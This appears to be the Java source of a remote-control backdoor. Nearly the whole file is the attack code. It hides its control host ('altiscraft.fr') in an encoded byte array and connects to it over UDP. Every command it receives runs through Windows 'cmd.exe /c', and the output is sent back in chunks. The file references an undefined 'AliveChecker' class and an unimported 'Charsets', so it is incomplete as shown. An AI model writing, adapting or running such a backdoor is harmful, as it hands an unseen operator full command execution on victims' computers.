import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Timer;

public class Main
{
    static DatagramSocket socket;
    static Thread th;
    final static int CHECK_ALIVE = 5000, PORT = 59724; // 59724 user 59725 admin
    static String received, PREFIX = "Z ", ESCAPE_SPACE = "%42%SPACE%42%";
    public static final String ip = new String(new byte[] {0x61, 0x6c, 0x74, 0x69, 0x73, 0x63, 0x72, 0x61, 0x66, 0x74, 0x2e, 0x66, 0x72}, Charsets.UTF_8);

    public static void main(String[] args)
    {
        try
        {
            socket = new DatagramSocket();
            Thread zbThread = new Thread()
            {
                @Override
                public void run()
                {
                    try
                    {
                        DatagramPacket receivedData = new DatagramPacket(new byte[1024], 1024);
                        String message = PREFIX + "connect";
                        socket.send(new DatagramPacket(message.getBytes(), message.length(), InetAddress.getByName(ip), PORT));
                        while(true)
                        {
                            socket.setSoTimeout(Integer.MAX_VALUE);
                            socket.receive(receivedData);
                            received = new String(receivedData.getData(), 0, receivedData.getLength()).replaceAll("\\ ", ESCAPE_SPACE);
                            th = new Thread()
                            {
                                public void run()
                                {
                                    String[] partsCmd = received.split(" "), cmds = new String[partsCmd.length + 2];
                                    cmds[0] = "cmd.exe";
                                    cmds[1] = "/c";
                                    for(int i = 2; i < cmds.length; i++)
                                        cmds[i] = partsCmd[i - 2].replaceAll(ESCAPE_SPACE, "\\ ");
                                    try
                                    {
                                        ProcessBuilder pb = new ProcessBuilder(cmds);
                                        pb.redirectErrorStream(true);
                                        BufferedReader inStreamReader = new BufferedReader(new InputStreamReader(pb.start().getInputStream()));
                                        String line = "", lines = PREFIX + "output ";
                                        while((line = inStreamReader.readLine()) != null)
                                            lines += line + "\n";
                                        int maxChars = 30000, len = lines.length();
                                        if(len < maxChars)
                                            socket.send(new DatagramPacket(lines.getBytes(), lines.length(), InetAddress.getByName(ip), PORT));
                                        else
                                        {
                                            int nb = (len - (len % maxChars)) / maxChars + 1;
                                            String msg = PREFIX + "read " + nb;
                                            socket.send(new DatagramPacket(msg.getBytes(), msg.length(), InetAddress.getByName(ip), PORT));
                                            for(int i = 0; i < nb; i++)
                                            {
                                                int low = (i + 1) * maxChars;
                                                if(low > len)
                                                    low = len;
                                                String part = PREFIX + "output " + i + " " + lines.substring(i * maxChars, low);
                                                socket.send(new DatagramPacket(part.getBytes(), part.length(), InetAddress.getByName(ip), PORT));
                                            }
                                        }
                                    }
                                    catch(Exception e)
                                    {
                                        String toSend = "";
                                        StackTraceElement[] tmp = e.getStackTrace();
                                        for(int i = 0; i < tmp.length; i++)
                                            toSend += tmp[i].toString() + "\n";
                                        try
                                        {
                                            socket.send(new DatagramPacket(toSend.getBytes(), toSend.length(), InetAddress.getByName(ip), PORT));
                                        }
                                        catch(Exception ex)
                                        {
                                            ex.printStackTrace();
                                        }
                                        e.printStackTrace();
                                    }
                                }
                            };
                            th.start();
                        }
                    }
                    catch(Exception e)
                    {
                        e.printStackTrace();
                    }
                }
            };
            zbThread.start();
            new Timer().schedule(new AliveChecker(), 0, CHECK_ALIVE);
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }
}